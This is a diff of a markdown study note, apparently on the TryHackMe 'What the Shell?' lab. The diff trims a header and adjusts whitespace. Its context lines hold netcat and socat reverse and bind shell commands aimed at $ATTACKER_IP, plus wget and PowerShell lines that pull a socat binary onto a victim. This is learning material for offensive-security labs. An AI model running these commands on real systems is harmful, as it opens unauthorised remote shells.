@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-27-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-27
-
 # What the Shell?
 
 ## What Is a Shell?
@@ -73,7 +68,7 @@ You can _mostly_ bypass the need for the `stty` command by using `rlwrap`, which
 It’s also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you’d transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.
 
 - UNIX LIKE: `wget $ATTACKER_IP/socat -O /tmp/socat`
-- WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows emp\socat.exe`
+- WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows	emp\socat.exe`
 
 NOTE that in _none_ of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
 
@@ -88,14 +83,17 @@ Socat: Just an anything-to-anything connector!
 #
 nc -lnp $LISTENER_PORT
 socat TCP-LISTEN:$LISTENER_PORT -
+
 # Reverse shell (target)
 #
 nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash
 socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"
+
 # Bind shell (attacker)
 #
 nc $TARGET_IP $LISTENER_PORT
 socat TCP:$TARGET_IP:$LISTENER_PORT
+
 # Bind shell (target)
 #
 nc -lnp $LISTENER_PORT -e /bin/bash
@@ -112,6 +110,7 @@ We can use socat to create an auto-stabilized reverse shell on UNIX-like systems
 # Basically the `stty raw -echo`.
 #
 socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
+
 # Target: Connect the listener on the attacker to an
 # interactive login bash shell.
 #
@@ -123,7 +122,7 @@ socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
 # terminal's environment
 #
 socat TCP:$ATTACKER_IP:$LISTENER_PORT \
-EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
+	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 NOTE that it’s perfectly acceptable to kick off a socat process from inside a netcat process!
